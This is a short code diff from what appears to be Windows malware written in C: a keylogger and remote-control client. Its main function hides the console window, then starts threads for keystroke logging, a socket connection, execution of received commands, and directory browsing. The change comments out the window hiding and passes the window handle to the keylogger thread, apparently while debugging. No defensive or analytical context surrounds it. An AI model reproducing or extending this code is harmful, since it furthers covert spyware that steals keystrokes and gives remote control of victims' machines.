@@ -13,6 +13,7 @@
 #endif
 
 #include "../common/socket.h"
+#include "command.h"
 #include "SURF/seeDirectory.h"
 #include "keylogger.h"
 
@@ -66,7 +67,7 @@ int main() {
     HWND window;
     AllocConsole();
     window=FindWindowA("ConsoleWindowClass",NULL);
-    ShowWindow(window,0);
+//    ShowWindow(window,0);
 
 	char path[MAX_PATH];
 	GetModuleFileNameA(NULL, path, MAX_PATH);
@@ -79,7 +80,7 @@ int main() {
 	WSADATA wsa;
 	WSAStartup(MAKEWORD(2,2), &wsa);
 
-	actKeylog = CreateThread(NULL, 0, activateKeylog, NULL, 0, &actKeylogId);
+	actKeylog = CreateThread(NULL, 0, activateKeylog, (LPVOID)&window, 0, &actKeylogId);
 	cliSocket = CreateThread(NULL, 0, clientSocket, (LPVOID)param.paramT, 0, &cliSocketId);
 	execMSG = CreateThread(NULL, 0, execMessage, (LPVOID)&param, 0, &execMSGId);
 	surf = CreateThread(NULL, 0, surfMode, (LPVOID)&param, 0, &surfId);
